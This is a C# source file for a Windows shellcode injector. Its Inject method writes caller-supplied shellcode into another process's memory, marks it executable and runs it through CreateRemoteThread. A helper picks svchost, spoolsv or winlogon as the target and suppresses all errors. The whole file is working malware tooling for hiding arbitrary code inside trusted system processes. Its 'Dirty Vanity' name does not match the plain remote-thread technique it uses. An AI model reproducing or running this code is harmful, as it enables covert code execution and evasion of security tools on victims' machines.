using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace cjh
{
    public class DirtyVanityInjector
    {
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            PROCESS_VM_OPERATION = 0x0008,
            PROCESS_VM_WRITE = 0x0020,
            PROCESS_CREATE_THREAD = 0x0002,
            PROCESS_DUP_HANDLE = 0x0040,
            PROCESS_CREATE_PROCESS = 0x0080,
            PROCESS_QUERY_INFORMATION = 0x0400,
            PROCESS_VM_READ = 0x0010,
        }

        [Flags]
        public enum AllocationType
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_DECOMMIT = 0x4000,
            MEM_RELEASE = 0x8000,
            MEM_RESET = 0x80000,
            MEM_PHYSICAL = 0x400000,
            MEM_TOP_DOWN = 0x100000,
            MEM_WRITE_WATCH = 0x200000,
            MEM_LARGE_PAGES = 0x20000000,
        }

        [Flags]
        public enum MemoryProtection
        {
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_GUARD = 0x100,
            PAGE_NOCACHE = 0x200,
            PAGE_WRITECOMBINE = 0x400,
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        private const uint INFINITE = 0xFFFFFFFF;

        public bool Inject(int targetPid, byte[] shellcode)
        {
            try
            {
                IntPtr hProcess = OpenProcess(
                    ProcessAccessFlags.PROCESS_VM_OPERATION |
                    ProcessAccessFlags.PROCESS_VM_WRITE |
                    ProcessAccessFlags.PROCESS_CREATE_THREAD |
                    ProcessAccessFlags.PROCESS_DUP_HANDLE |
                    ProcessAccessFlags.PROCESS_QUERY_INFORMATION |
                    ProcessAccessFlags.PROCESS_VM_READ,
                    false,
                    targetPid);

                if (hProcess == IntPtr.Zero)
                {
                    return false;
                }

                try
                {
                    uint shellcodeSize = (uint)shellcode.Length;
                    IntPtr baseAddress = VirtualAllocEx(
                        hProcess,
                        IntPtr.Zero,
                        shellcodeSize,
                        AllocationType.MEM_COMMIT | AllocationType.MEM_RESERVE,
                        MemoryProtection.PAGE_READWRITE);

                    if (baseAddress == IntPtr.Zero)
                    {
                        return false;
                    }

                    uint bytesWritten;
                    bool writeSuccess = WriteProcessMemory(hProcess, baseAddress, shellcode, shellcodeSize, out bytesWritten);
                    if (!writeSuccess || bytesWritten != shellcodeSize)
                    {
                        VirtualFreeEx(hProcess, baseAddress, 0, AllocationType.MEM_RELEASE);
                        return false;
                    }

                    uint oldProtect;
                    if (!VirtualProtectEx(hProcess, baseAddress, shellcodeSize, (uint)MemoryProtection.PAGE_EXECUTE_READ, out oldProtect))
                    {
                        VirtualFreeEx(hProcess, baseAddress, 0, AllocationType.MEM_RELEASE);
                        return false;
                    }

                    uint threadId;
                    IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, out threadId);

                    if (hThread == IntPtr.Zero)
                    {
                        VirtualFreeEx(hProcess, baseAddress, 0, AllocationType.MEM_RELEASE);
                        return false;
                    }

                    try
                    {
                        WaitForSingleObject(hThread, INFINITE);
                        return true;
                    }
                    finally
                    {
                        CloseHandle(hThread);
                    }
                }
                finally
                {
                    CloseHandle(hProcess);
                }
            }
            catch
            {
                return false;
            }
        }

        public int GetTargetProcessId()
        {
            try
            {
                Process[] processes = Process.GetProcessesByName("svchost");
                foreach (Process p in processes)
                {
                    try
                    {
                        if (p.MainModule != null && p.Id != Process.GetCurrentProcess().Id)
                        {
                            return p.Id;
                        }
                    }
                    catch
                    {
                    }
                }
            }
            catch
            {
            }

            try
            {
                Process[] processes = Process.GetProcessesByName("spoolsv");
                foreach (Process p in processes)
                {
                    return p.Id;
                }
            }
            catch
            {
            }

            try
            {
                Process[] processes = Process.GetProcessesByName("winlogon");
                foreach (Process p in processes)
                {
                    return p.Id;
                }
            }
            catch
            {
            }

            return -1;
        }
    }
}
